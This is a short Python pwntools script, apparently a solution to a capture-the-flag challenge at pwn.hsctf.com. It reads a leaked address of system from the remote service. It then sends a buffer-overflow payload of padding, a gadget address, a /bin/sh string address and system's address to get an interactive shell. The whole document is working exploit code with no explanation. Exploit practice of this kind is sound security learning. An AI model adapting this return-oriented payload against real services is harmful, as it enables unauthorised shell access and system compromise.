from pwn import *

p=remote('pwn.hsctf.com',3131)

p.recvuntil('computer: ')
system = int(p.recvline()[:-1],16)
binsh = 0x402051

p.sendline('A'*16+p64(0x0000000000401273)+p64(binsh)+p64(system))
p.interactive()
